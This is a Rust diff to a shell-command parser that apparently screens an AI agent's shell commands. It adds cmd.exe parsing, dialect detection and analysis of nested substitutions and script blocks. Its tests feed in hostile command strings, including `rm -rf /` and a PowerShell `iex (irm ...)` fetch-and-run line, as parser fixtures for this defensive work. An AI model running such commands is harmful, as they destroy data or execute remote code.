@@ -11,15 +11,29 @@
 pub enum Dialect {
     Posix,
     PowerShell,
+    /// Windows cmd.exe.
+    Cmd,
 }
 
 impl Dialect {
-    /// The dialect the `shell` tool runs on this platform.
+    /// Every dialect, for scans that must not depend on which shell runs a line.
+    pub const ALL: [Dialect; 3] = [Dialect::Posix, Dialect::PowerShell, Dialect::Cmd];
+
+    /// The dialect of the default `shell` tool interpreter.
     pub fn host() -> Self {
-        if cfg!(windows) {
-            Self::PowerShell
-        } else {
-            Self::Posix
+        Self::of(crate::process::Shell::current().kind)
+    }
+
+    /// The dialect `command` is judged and run in: the shell it is routed to.
+    pub fn for_command(command: &str) -> Self {
+        Self::of(crate::process::Shell::route(command).kind)
+    }
+
+    pub fn of(kind: crate::process::ShellKind) -> Self {
+        match kind {
+            crate::process::ShellKind::PowerShell => Self::PowerShell,
+            crate::process::ShellKind::Posix => Self::Posix,
+            crate::process::ShellKind::Cmd => Self::Cmd,
         }
     }
 }
@@ -34,6 +48,8 @@ pub struct Word {
     pub glob: bool,
     /// Some part of the word was quoted or escaped.
     pub quoted: bool,
+    /// A PowerShell script block; its commands are in the line's pipelines.
+    pub block: bool,
 }
 
 #[derive(Clone, Debug, PartialEq, Eq)]
@@ -60,10 +76,11 @@ impl Simple {
 #[derive(Clone, Debug, Default)]
 pub struct Line {
     /// Commands joined by `|`; pipelines are separated by `;`, `&&`, `||`, `&` or newlines.
+    /// Commands inside substitutions and script blocks are pipelines of their own.
     pub pipelines: Vec<Vec<Simple>>,
     /// Why the line cannot be judged statically; empty when it can.
     pub opaque: Vec<&'static str>,
-    /// Inner text of `$(..)`, backticks, `<(..)` and PowerShell `$(..)`/`@(..)`.
+    /// Inner text of `$(..)`, backticks, `<(..)`, PowerShell `$(..)`/`@(..)` and script blocks.
     pub substitutions: Vec<String>,
 }
 
@@ -91,7 +108,21 @@ pub fn normalize_dashes(line: &str) -> String {
 }
 
 pub fn parse(line: &str, dialect: Dialect) -> Line {
+    parse_at(line, dialect, 0)
+}
+
+/// Substitutions and blocks nested deeper than this are not looked into.
+const MAX_DEPTH: usize = 8;
+
+fn parse_at(line: &str, dialect: Dialect, depth: usize) -> Line {
     let mut opaque = Vec::new();
+    if depth > MAX_DEPTH {
+        opaque.push("nesting too deep");
+        return Line {
+            opaque,
+            ..Line::default()
+        };
+    }
     if line.chars().any(is_hidden) {
         opaque.push("hidden or control characters");
     }
@@ -109,6 +140,7 @@ pub fn parse(line: &str, dialect: Dialect) -> Line {
         chars: text,
         index: 0,
         dialect,
+        depth,
         line: Line {
             opaque,
             ..Line::default()
@@ -130,6 +162,7 @@ struct Parser {
     chars: Vec<char>,
     index: usize,
     dialect: Dialect,
+    depth: usize,
     line: Line,
     pipeline: Vec<Simple>,
     simple: Simple,
@@ -286,12 +319,21 @@ impl Parser {
         inner
     }
 
-    fn substitution(&mut self, inner: String, reason: &'static str) {
-        self.opaque(reason);
+    fn substitution(&mut self, inner: String, _reason: &'static str) {
+        self.nested(&inner);
         self.line.substitutions.push(inner);
         let word = self.word();
         word.dynamic = true;
         word.text.push_str("$(...)");
+    }
+
+    /// Parses nested text in the same dialect; its commands join the line, so each
+    /// is judged like any other.
+    fn nested(&mut self, inner: &str) {
+        let nested = parse_at(inner, self.dialect, self.depth + 1);
+        self.line.opaque.extend(nested.opaque);
+        self.line.substitutions.extend(nested.substitutions);
+        self.line.pipelines.extend(nested.pipelines);
     }
 
     /// `$` outside single quotes. Returns after consuming what it handled.
@@ -425,6 +467,7 @@ impl Parser {
             match self.dialect {
                 Dialect::Posix => self.posix(c),
                 Dialect::PowerShell => self.powershell(c),
+                Dialect::Cmd => self.cmd(c),
             }
         }
         self.finish_pipeline();
@@ -553,11 +596,27 @@ impl Parser {
                     }
                 }
             }
-            ';' | '(' | ')' => {
+            ';' => {
                 self.index += 1;
-                if c != ';' {
-                    self.opaque("subshell or function");
+                self.finish_pipeline();
+            }
+            '(' => {
+                self.index += 1;
+                if self.peek(0) == Some('(') {
+                    // `(( i++ ))`: arithmetic, no command runs.
+                    self.index += 1;
+                    self.balanced('(', ')');
+                    if self.peek(0) == Some(')') {
+                        self.index += 1;
+                    }
+                } else if self.word.is_some() || !self.simple.words.is_empty() {
+                    // `name() { ...; }` defines a command the rest of the line may call.
+                    self.opaque("function definition");
                 }
+                self.finish_pipeline();
+            }
+            ')' => {
+                self.index += 1;
                 self.finish_pipeline();
             }
             '#' if self.word.is_none() => {
@@ -570,7 +629,6 @@ impl Parser {
                     && self.peek(1).is_none_or(|n| n.is_whitespace() || n == ';') =>
             {
                 self.index += 1;
-                self.opaque("command group");
                 self.finish_pipeline();
             }
             '*' | '?' | '[' => {
@@ -686,20 +744,61 @@ impl Parser {
                 self.index += 2;
                 let close = if open == '(' { ')' } else { '}' };
                 let inner = self.balanced(open, close);
-                self.substitution(inner, "PowerShell array or hashtable expression");
+                if open == '{' {
+                    // A hashtable, not a script: keys and values are not commands.
+                    self.opaque("PowerShell hashtable");
+                    self.line.substitutions.push(inner);
+                    self.word().dynamic = true;
+                } else {
+                    self.substitution(inner, "PowerShell array expression");
+                }
             }
             '@' if matches!(self.peek(1), Some('\'') | Some('"')) => {
                 self.opaque("PowerShell here-string");
                 self.index += 1;
             }
-            '{' | '}' => {
+            '{' => {
                 self.index += 1;
-                self.opaque("PowerShell script block");
+                self.finish_word();
+                let inner = self.balanced('{', '}');
+                self.nested(&inner);
+                self.line.substitutions.push(inner);
+                let word = self.word();
+                word.block = true;
+                word.text.push_str("{...}");
+                self.finish_word();
+            }
+            '}' => {
+                self.index += 1;
+                self.opaque("unbalanced braces");
                 self.finish_pipeline();
             }
-            '(' | ')' => {
+            '(' => {
+                let keyword = self.word.as_ref().is_some_and(|w| {
+                    !w.quoted
+                        && matches!(
+                            w.text.to_ascii_lowercase().as_str(),
+                            "if" | "elseif" | "while" | "switch" | "foreach" | "for"
+                        )
+                });
+                if keyword {
+                    self.finish_word();
+                }
+                if self.word.is_some() {
+                    // `$items.Delete()`: a method call can do anything.
+                    self.index += 1;
+                    self.opaque("PowerShell method call");
+                    self.finish_pipeline();
+                } else {
+                    // `(Get-Item $f).Length`, `if (...)`: an expression whose commands join the line.
+                    self.index += 1;
+                    let inner = self.balanced('(', ')');
+                    self.substitution(inner, "PowerShell subexpression");
+                }
+            }
+            ')' => {
                 self.index += 1;
-                self.opaque("PowerShell subexpression");
+                self.opaque("unbalanced parentheses");
                 self.finish_pipeline();
             }
             '<' if self.peek(1) == Some('#') => {
@@ -770,6 +869,225 @@ impl Parser {
             }
         }
     }
+
+    /// cmd.exe: `&` separates commands, `^` escapes, `%VAR%` expands, parentheses
+    /// open `if`/`for` blocks (not judged).
+    fn cmd(&mut self, c: char) {
+        match c {
+            ' ' | '\t' | '\r' => {
+                self.index += 1;
+                self.finish_word();
+            }
+            '\n' => {
+                self.index += 1;
+                self.finish_pipeline();
+            }
+            '^' => {
+                match self.peek(1) {
+                    Some('\n') => {}
+                    Some(next) => {
+                        self.push(next);
+                        self.word().quoted = true;
+                    }
+                    None => {}
+                }
+                self.index += 2;
+            }
+            '"' => {
+                self.index += 1;
+                self.word().quoted = true;
+                let mut closed = false;
+                while let Some(next) = self.peek(0) {
+                    self.index += 1;
+                    match next {
+                        '"' => {
+                            closed = true;
+                            break;
+                        }
+                        '%' => self.percent(),
+                        other => self.push(other),
+                    }
+                }
+                if !closed {
+                    self.opaque("unterminated quote");
+                }
+            }
+            '%' => {
+                self.index += 1;
+                self.percent();
+            }
+            '!' if self.chars[self.index + 1..].contains(&'!') => {
+                // Delayed expansion (`!VAR!`) when enabled: the value is unknown.
+                self.index += 1;
+                self.word().dynamic = true;
+                self.push('!');
+            }
+            '@' if self.word.is_none() && self.simple.words.is_empty() => {
+                self.index += 1;
+            }
+            ':' if self.word.is_none() && self.simple.words.is_empty() && self.peek(1) == Some(':') => {
+                while self.peek(0).is_some_and(|next| next != '\n') {
+                    self.index += 1;
+                }
+            }
+            '<' | '>' => {
+                self.redirect_op();
+            }
+            '|' => {
+                self.index += 1;
+                if self.peek(0) == Some('|') {
+                    self.index += 1;
+                    self.finish_pipeline();
+                } else {
+                    self.finish_simple();
+                }
+            }
+            '&' => {
+                self.index += 1;
+                if self.peek(0) == Some('&') {
+                    self.index += 1;
+                }
+                self.finish_pipeline();
+            }
+            '(' | ')' => {
+                self.index += 1;
+                self.opaque("cmd block");
+                self.finish_pipeline();
+            }
+            '*' | '?' => {
+                self.index += 1;
+                self.push(c);
+                self.word().glob = true;
+            }
+            other => {
+                self.index += 1;
+                self.push(other);
+            }
+        }
+    }
+
+    /// After a `%`: `%NAME%`, `%~dp0`, `%%i` and `%1` expand; a lone `%` stays.
+    fn percent(&mut self) {
+        let rest: String = self.chars[self.index..].iter().take(64).collect();
+        let name_end = rest.find(|c: char| c == '%' || c.is_whitespace() || c == '"');
+        let expands = match rest.chars().next() {
+            Some('%') | Some('~') => true,
+            Some(c) if c.is_ascii_digit() || c == '*' => true,
+            _ => name_end.is_some_and(|end| end > 0 && rest[end..].starts_with('%')),
+        };
+        if !expands {
+            self.push('%');
+            return;
+        }
+        let word = self.word();
+        word.dynamic = true;
+        word.text.push('%');
+        match rest.chars().next() {
+            Some('%') => {
+                self.index += 1;
+                if let Some(next) = self.peek(0) {
+                    self.index += 1;
+                    self.push(next);
+                }
+            }
+            Some('~') | Some('*') => {
+                while let Some(next) = self.peek(0).filter(|c| c.is_alphanumeric() || "~$:*".contains(*c)) {
+                    self.index += 1;
+                    self.push(next);
+                }
+            }
+            Some(c) if c.is_ascii_digit() => {
+                self.index += 1;
+                self.push(c);
+            }
+            _ => {
+                let end = name_end.unwrap_or(0);
+                for _ in 0..=end {
+                    if let Some(next) = self.peek(0) {
+                        self.index += 1;
+                        self.push(next);
+                    }
+                }
+            }
+        }
+    }
+}
+
+/// The dialect a command is written in when its syntax says so unambiguously:
+/// PowerShell cmdlets and variables, cmd `%VAR%` and builtins with `/` switches,
+/// POSIX keywords, `/dev/null` and common Unix tools. `None` when nothing tells.
+pub fn detect(command: &str) -> Option<Dialect> {
+    let mut scores = [0_u32; 3];
+    let index = |dialect: Dialect| dialect as usize;
+    let lower = command.to_ascii_lowercase();
+    let words: Vec<&str> = command
+        .split(|c: char| c.is_whitespace() || matches!(c, '|' | ';' | '&' | '(' | ')' | '{' | '}'))
+        .filter(|w| !w.is_empty())
+        .collect();
+    for (position, word) in words.iter().enumerate() {
+        let word_lower = word.to_ascii_lowercase();
+        let first = position == 0
+            || command
+                .split(['|', ';', '&', '\n'])
+                .any(|part| part.split_whitespace().next() == Some(word));
+        if first && cmdlet(word) {
+            scores[index(Dialect::PowerShell)] += 3;
+        }
+        if first
+            && matches!(
+                word_lower.as_str(),
+                "grep" | "sed" | "awk" | "head" | "tail" | "xargs" | "wc" | "cut" | "export"
+                    | "while" | "do" | "done" | "then" | "fi" | "esac" | "read" | "source"
+            )
+        {
+            scores[index(Dialect::Posix)] += 2;
+        }
+        if first && matches!(word_lower.as_str(), "findstr" | "rem" | "setlocal" | "endlocal") {
+            scores[index(Dialect::Cmd)] += 3;
+        }
+        if word.starts_with("$env:") || *word == "$_" || word.starts_with("$_.") || word_lower == "$null" {
+            scores[index(Dialect::PowerShell)] += 3;
+        }
+        if word.len() > 2 && word.starts_with('%') && word.ends_with('%') && !word[1..word.len() - 1].contains('%') {
+            scores[index(Dialect::Cmd)] += 3;
+        }
+    }
+    if lower.contains("/dev/null") || lower.contains("<<") || lower.contains("2>&1 |") {
+        scores[index(Dialect::Posix)] += 2;
+    }
+    if lower.contains(">nul") || lower.contains("> nul") {
+        scores[index(Dialect::Cmd)] += 2;
+    }
+    if let Some(first) = words.first() {
+        let first = first.to_ascii_lowercase();
+        let switch = words.get(1).is_some_and(|w| w.starts_with('/') && w.len() <= 3);
+        if switch && matches!(first.as_str(), "dir" | "type" | "copy" | "del" | "move" | "xcopy" | "where") {
+            scores[index(Dialect::Cmd)] += 3;
+        }
+    }
+    let best = *scores.iter().max()?;
+    if best < 3 {
+        return None;
+    }
+    let winners: Vec<usize> = (0..3).filter(|i| scores[*i] == best).collect();
+    (winners.len() == 1).then(|| Dialect::ALL[winners[0]])
+}
+
+/// `Get-ChildItem`-style names: an approved-looking verb, a dash, a noun.
+fn cmdlet(word: &str) -> bool {
+    let Some((verb, noun)) = word.split_once('-') else {
+        return false;
+    };
+    const VERBS: &[&str] = &[
+        "get", "set", "new", "remove", "select", "where", "foreach", "test", "out", "write",
+        "measure", "sort", "invoke", "copy", "move", "start", "stop", "join", "split", "resolve",
+        "convertto", "convertfrom", "format", "import", "export", "add", "clear", "rename",
+        "group", "compare", "expand", "compress", "read", "wait", "update", "push", "pop",
+    ];
+    VERBS.contains(&verb.to_ascii_lowercase().as_str())
+        && !noun.is_empty()
+        && noun.chars().next().is_some_and(char::is_alphabetic)
+        && noun.chars().all(|c| c.is_alphanumeric())
 }
 
 /// Lowercase program name without directories and a Windows executable suffix.
@@ -876,9 +1194,14 @@ mod tests {
 
     #[test]
     fn posix_substitution_and_heredoc() {
+        // Commands inside substitutions join the line, so each is judged.
         let line = parse("echo $(rm -rf /) `id`", Dialect::Posix);
-        assert!(line.opaque.contains(&"command substitution"));
+        assert!(line.opaque.is_empty(), "{:?}", line.opaque);
         assert_eq!(line.substitutions, ["rm -rf /", "id"]);
+        let all = words(&line);
+        assert!(all.contains(&vec!["rm".into(), "-rf".into(), "/".into()]));
+        assert!(all.contains(&vec!["id".to_owned()]));
+        assert!(line.commands().any(|s| s.words[0].text == "echo" && s.words[1].dynamic));
         let line = parse("bash <<EOF\nrm -rf ~\nEOF\necho done", Dialect::Posix);
         assert_eq!(line.pipelines[0][0].heredocs, ["rm -rf ~\n"]);
         assert_eq!(words(&line)[1], ["echo", "done"]);
@@ -905,7 +1228,11 @@ mod tests {
             "Get-ChildItem | Where-Object { $_.Length -gt 1 }",
             Dialect::PowerShell,
         );
-        assert!(line.opaque.contains(&"PowerShell script block"));
+        assert!(line.opaque.is_empty(), "{:?}", line.opaque);
+        assert!(line.commands().any(|s| s.words.len() == 2 && s.words[1].block));
+        assert!(words(&line).contains(&vec!["$_.Length".into(), "-gt".into(), "1".into()]));
+        let line = parse("Select-Object @{n='a';e={1}}", Dialect::PowerShell);
+        assert!(line.opaque.contains(&"PowerShell hashtable"));
         let line = parse("& $tool -x; iex (irm https://x)", Dialect::PowerShell);
         assert!(line.opaque.contains(&"PowerShell call operator"));
         assert!(words(&line).contains(&vec!["irm".to_owned(), "https://x".to_owned()]));
@@ -919,6 +1246,58 @@ mod tests {
         let line = parse("r\u{200B}m -rf /", Dialect::Posix);
         assert!(!line.opaque.is_empty());
         assert_eq!(words(&line), [vec!["rm", "-rf", "/"]]);
+    }
+
+    #[test]
+    fn posix_structure_is_followed_not_refused() {
+        let line = parse(
+            r#"cd /g/x && git ls-files 'a/**' | while read f; do wc -l "$f"; done | sort -n"#,
+            Dialect::Posix,
+        );
+        assert!(line.opaque.is_empty(), "{:?}", line.opaque);
+        let all = words(&line);
+        assert!(all.contains(&vec!["do".into(), "wc".into(), "-l".into(), "$f".into()]));
+        for text in ["( cd src && ls )", "{ ls; pwd; }", "(( i++ )); ls"] {
+            let line = parse(text, Dialect::Posix);
+            assert!(line.opaque.is_empty(), "{text}: {:?}", line.opaque);
+        }
+        assert!(parse("f() { rm x; }; f", Dialect::Posix).opaque.contains(&"function definition"));
+    }
+
+    #[test]
+    fn cmd_lines() {
+        let line = parse(
+            r#"dir /s /b "C:\a b" 2>nul & type %USERPROFILE%\x.txt | findstr ^& foo"#,
+            Dialect::Cmd,
+        );
+        assert!(line.opaque.is_empty(), "{:?}", line.opaque);
+        assert_eq!(
+            words(&line),
+            [
+                vec!["dir", "/s", "/b", "C:\\a b"],
+                vec!["type", "%USERPROFILE%\\x.txt"],
+                vec!["findstr", "&", "foo"],
+            ]
+        );
+        assert!(line.pipelines[1][0].words[1].dynamic);
+        assert!(parse("if exist a (del a)", Dialect::Cmd).opaque.contains(&"cmd block"));
+        assert_eq!(words(&parse("echo 100%", Dialect::Cmd)), [vec!["echo", "100%"]]);
+    }
+
+    #[test]
+    fn dialect_is_detected_only_when_the_syntax_says_so() {
+        assert_eq!(detect("Get-ChildItem -Recurse | Select-String foo"), Some(Dialect::PowerShell));
+        assert_eq!(detect("Write-Output $env:PATH"), Some(Dialect::PowerShell));
+        assert_eq!(detect("dir /s /b src"), Some(Dialect::Cmd));
+        assert_eq!(detect("echo %USERPROFILE%"), Some(Dialect::Cmd));
+        assert_eq!(
+            detect(r#"git ls-files | while read f; do wc -l "$f"; done"#),
+            Some(Dialect::Posix)
+        );
+        assert_eq!(detect("ls 2>/dev/null | head -5"), Some(Dialect::Posix));
+        for neutral in ["git status", "cargo test", "npm run build", "echo hi"] {
+            assert_eq!(detect(neutral), None, "{neutral}");
+        }
     }
 
     #[test]
